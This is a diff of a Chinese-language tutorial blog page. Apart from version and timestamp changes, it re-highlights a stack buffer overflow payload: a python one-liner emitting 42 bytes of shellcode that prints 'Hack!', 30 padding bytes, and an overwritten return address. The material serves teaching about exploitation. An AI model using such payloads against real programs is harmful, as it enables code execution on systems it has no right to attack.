@@ -66,7 +66,7 @@
 
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 6.1.0">
+<meta name="generator" content="Hexo 6.3.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 <link rel="alternate" href="/rss2.xml" title="Horizon Blog" type="application/rss+xml">
 </head>
@@ -258,7 +258,7 @@
             
               <p class="note note-info">
                 
-                  Last Update @ 2022年11月13日 周日 9:33:16
+                  Last Update @ 2023年4月7日 周五 7:35:23
                 
               </p>
             
@@ -532,7 +532,7 @@ END:
   401025:       48 61                   rex.W (bad) 
   401027:       63 6b 21                movsxd ebp,DWORD PTR [rbx+0x21]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这份 shellcode 的长度只有 42 字节, 因此我们还需要再填充 30 字节的数据, 之后才是用来覆盖返回地址的 <code>&amp;name[0]</code>. 因为其中有很多不可打印的字符, 所以我们用 python 把它输出到一个文件, 然后从文件作为输入.</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python -c 'print ("\xeb\x1e\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x05\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\xe8\xdd\xff\xff\xff\x48\x61\x63\x6b\x21" + "\xdb"*30 + "\x10\xde\xff\xff\xff\x7f\x00\x00")' &gt; shellcode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python -c <span class="token string">'print ("\xeb\x1e\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x05\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\xe8\xdd\xff\xff\xff\x48\x61\x63\x6b\x21" + "\xdb"*30 + "\x10\xde\xff\xff\xff\x7f\x00\x00")'</span> <span class="token operator">&gt;</span> shellcode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <blockquote>
 <p>注意小端序</p>
 </blockquote>
